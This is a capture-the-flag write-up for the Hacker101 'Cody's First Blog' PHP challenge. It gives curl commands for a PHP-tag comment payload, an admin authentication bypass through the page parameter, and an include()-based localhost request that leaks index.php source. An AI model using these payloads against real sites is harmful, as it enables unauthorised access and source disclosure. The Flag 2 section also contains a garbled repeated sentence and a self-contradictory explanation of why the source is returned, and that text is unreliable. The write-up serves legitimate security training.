# Cody's First Blog (Moderate)
 

**Difficulty:** Moderate  
**Category:** Web / PHP / File Inclusion  
**Flags:** 3
---
## Overview
The challenge presents a simple PHP blog engine. The homepage displays a single post ("First") where the author explains their blog architecture: *"PHP doesn't need a template language because it **is** a template language. This server can't talk to the outside world and nobody but me can upload files, so there's no risk in just using `include()`."*
This statement hints at all three vulnerabilities:
1. **PHP execution via comments** — user input rendered without escaping
2. **Authentication bypass** — admin panel accessible by removing "auth" from the filename
3. **File inclusion / SSRF** — the `?page=` parameter with `include()` can fetch local URLs
**Server:** PHP, MySQL (MariaDB)
---
## Reconnaissance
### Application Behavior
Browsing the application reveals:
- **GET /**: Default page with one blog post and a comment form (`<textarea name="body">`)
- **POST /**: Submits a comment; redirects with a "Comment submitted and awaiting approval!" message
- **Hidden admin link**: An HTML comment `<!--<a href="?page=admin.auth.inc">Admin login</a>-->` hints at an admin panel
The comment form is the only interactive element. The `?page=` parameter drives all navigation, suggesting a file-include-based router.
### Source Code Discovery (Flag2 context)
The full `index.php` source code, recovered via SSRF (see Flag2 below), reveals the application architecture:
```php
<?php
    // ^FLAG^<redacted>$FLAG$
    mysql_connect("localhost", "root", "");
    mysql_select_db("level4");
    $page = isset($_GET['page']) ? $_GET['page'] : 'home.inc';
    if(strpos($page, ':') !== false && substr($page, 0, 5) !== "http:")
        $page = "home.inc";
    if(isset($_POST['body'])) {
        mysql_query("INSERT INTO comments (page, body, approved) VALUES ('"
            . mysql_real_escape_string($page) . "', '"
            . mysql_real_escape_string($_POST['body']) . "', 0)");
        if(strpos($_POST['body'], '<?php') !== false)
            echo '<p>^FLAG^<redacted>$FLAG$</p>';
        // ... exit
    }
    ob_start();
    include($page . ".php");
    $body = ob_get_clean();
?>
```
Key observations:
- **`include($page . ".php")`**: The `?page=` parameter directly feeds into PHP's `include()`, appending `.php` to whatever value is supplied
- **Whitelist bypass**: Only blocks URLs with `:` that don't start with `http:`, meaning `http://` URLs are permitted
- **PHP detection**: When `<?php` appears in a comment body, Flag0 is returned directly (before even storing the comment)
- **Comment rendering**: Approved comments are echoed directly with `<?php echo $row["body"]; ?>` — no escaping, enabling PHP code execution if comments contain PHP tags
- **MySQL backend**: Comments are stored in a `comments` table with columns `page`, `body`, `approved`
---
## Flag 0 — PHP Detection in Comments
**Method:** Post a PHP payload in the comment form
The hints ask: *"What was the first input you saw? Figuring out what platform this is running on may give you some ideas."* The page title reveals the platform: PHP. Submitting `<?php phpinfo(); ?>` in the comment body triggers the server-side PHP detection logic.
The index.php source confirms this behavior:
```php
if(strpos($_POST['body'], '<?php') !== false)
    echo '<p>^FLAG^<redacted>$FLAG$</p>';
```
Any comment containing `<?php` returns the flag immediately, even before the comment is stored or approved:
```bash
curl -s -X POST \
  -d 'body=<?php phpinfo(); ?>' \
  'https://TARGET.ctf.hacker101.com/'
```
**Response:**
```
^FLAG^<redacted>$FLAG$
Comment submitted and awaiting approval!
```
> **Flag 0:** `^FLAG^<redacted>$FLAG$`
**Takeaway:** The simplest vulnerability detection (submitting PHP code and seeing what happens) yields the first flag. The server explicitly checks for PHP tags as a security gate.
---
## Flag 1 — Admin Panel Auth Bypass
**Method:** Remove "auth" from the admin page filename
The homepage HTML contains a commented-out link:
```html
<!--<a href="?page=admin.auth.inc">Admin login</a>-->
```
The hints: *"Make sure you check everything you're provided"* and *"Simple guessing might help you out."* The page naming convention `admin.auth.inc` suggests modular filenames. By removing `auth` from the path, we bypass the authentication layer entirely:
```
?page=admin.auth.inc   → Admin login (requires credentials)
?page=admin.inc         → Admin panel (no authentication)
```
```bash
curl -s 'https://TARGET.ctf.hacker101.com/?page=admin.inc'
```
The admin panel displays pending comments with approve links and — crucially — the flag in the page footer:
```html
<p>Admin flag is ^FLAG^<redacted>$FLAG$</p>
```
The admin panel also provides functionality to approve comments via `?page=admin.inc&approve=N`, which is needed for Flag2.
> **Flag 1:** `^FLAG^<redacted>$FLAG$`
**Takeaway:** Commented-out HTML, especially links to sensitive paths, should always be investigated. Modifying URL parameters (removing the auth prefix) can bypass authentication when file-include routing is used.
---
## Flag 2 — SSRF via HTTP Include
**Method:** Use `include()` with a `http://` URL to leak the PHP source code
The hints point directly at the vulnerability: *"Read the first blog post carefully. We talk about this in the Hacker101 File Inclusion Bugs video. Where can you access your own stored data? Include doesn't just work for filenames."*
### Understanding the Include Vulnerability
The line `include($page . ".php")` in index.php accepts user-controlled input from `$_GET['page']`. PHP's `include()` can fetch URLs when `allow_url_include` is enabled (or in certain configurations), making it a **Server-Side Request Forgery (SSRF)** vector.
Try the flag0 method first, then read the i flag0 method first, then read the i flag0 method first, then read the index.php source:
```bash
curl -s 'https://TARGET.ctf.hacker101.com/?page=http://localhost/index'
```
This constructs `include("http://localhost/index.php")`. PHP makes an HTTP request to itself, fetching the rendered output of `index.php`. Since this output is served over HTTP (not executed as PHP), the source code is returned verbatim — including the PHP comments.
The response includes the full `index.php` source code, where Flag2 is embedded in a comment:
```php
<?php
    // ^FLAG^<redacted>$FLAG$
    mysql_connect("localhost", "root", "");
    // ...
```
The SSRF works because:
1. The URL filter allows `http://` prefixes (`substr($page, 0, 5) === "http:"`)
2. PHP's `include()` makes an HTTP fetch to `localhost`, which returns the rendered (non-executed) PHP source
3. Flag2 sits in a PHP comment that's never exposed in normal page rendering
### Full index.php Source
The SSRF reveals the complete application logic:
```php
<?php
    // ^FLAG^<redacted>$FLAG$
    mysql_connect("localhost", "root", "");
    mysql_select_db("level4");
    $page = isset($_GET['page']) ? $_GET['page'] : 'home.inc';
    if(strpos($page, ':') !== false && substr($page, 0, 5) !== "http:")
        $page = "home.inc";
    if(isset($_POST['body'])) {
        mysql_query("INSERT INTO comments (page, body, approved) VALUES ('"
            . mysql_real_escape_string($page) . "', '"
            . mysql_real_escape_string($_POST['body']) . "', 0)");
        if(strpos($_POST['body'], '<?php') !== false)
            echo '<p>^FLAG^<redacted>$FLAG$</p>';
?>
    <p>Comment submitted and awaiting approval!</p>
    <a href="javascript:window.history.back()">Go back</a>
<?php
        exit();
    }
    ob_start();
    include($page . ".php");
    $body = ob_get_clean();
?>
<!doctype html>
<html>
    <head>
        <title><?php echo $title; ?> -- Cody's First Blog</title>
    </head>
    <body>
        <h1><?php echo $title; ?></h1>
        <?php echo $body; ?>
        <br>
        <br>
        <hr>
        <h3>Comments</h3>
        <!--<a href="?page=admin.auth.inc">Admin login</a>-->
        <h4>Add comment:</h4>
        <form method="POST">
            <textarea rows="4" cols="60" name="body"></textarea><br>
            <input type="submit" value="Submit">
        </form>
<?php
    $q = mysql_query("SELECT body FROM comments WHERE page='"
        . mysql_real_escape_string($page) . "' AND approved=1");
    while($row = mysql_fetch_assoc($q)) {
        ?>
        <hr>
        <p><?php echo $row["body"]; ?></p>
        <?php
    }
?>
    </body>
</html>
```
> **Flag 2:** `^FLAG^<redacted>$FLAG$`
**Takeaway:** PHP's `include()` with URL support is a powerful SSRF vector. When combined with a localhost fetch, it can leak source code that's never exposed in normal operation. The `http://` whitelist (while blocking other URL schemes) was intended to prevent arbitrary file inclusion but actually enables the most impactful attack.
---
## Complete Flag List
| Flag | Hash | Technique |
|:----:|------|-----------|
| 0 | `<redacted>` | PHP payload in comment body (server detects `<?php`) |
| 1 | `<redacted>` | Auth bypass: `admin.auth.inc` → `admin.inc` |
| 2 | `<redacted>` | SSRF: `?page=http://localhost/index` leaks `index.php` source |
---
## Key Takeaways
1. **`include($_GET[...])` is a death sentence.** Never pass user input directly to `include()`. Even with a `.php` suffix and URL scheme filtering, SSRF and local file inclusion are trivially achievable.
2. **PHP tags in user input should raise alarms.** The server explicitly scans for `<?php` — this proves the developers anticipated code injection but built a detection-based defense rather than a prevention-based one (proper output escaping).
3. **Comment-out HTML is not hidden.** The `<!--<a href="?page=admin.auth.inc">Admin login</a>-->` comment gave away the admin panel path. In production, sensitive endpoints should not be referenced in client-side code, even in comments.
4. **`http://` is as dangerous as `file://`.** The URL scheme filter blocks `file://` and other protocols, but allows `http://localhost`. Since include can make HTTP requests that return unexecuted PHP sources, this is equivalent to arbitrary file read.
5. **Source code belongs on the back-end, not in client responses.** Flag2 was hidden in a PHP comment. SSRF turned that private comment into public information. Never embed secrets in source code, even in comments.
---
## References
- [Hacker101 CTF Platform](https://ctf.hacker101.com/)
- [Hacker101 — File Inclusion Bugs (Video)](https://www.hacker101.com/sessions/file_inclusion)
- [OWASP — Unrestricted File Upload / Include](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PHP `include()` documentation](https://www.php.net/manual/en/function.include.php)
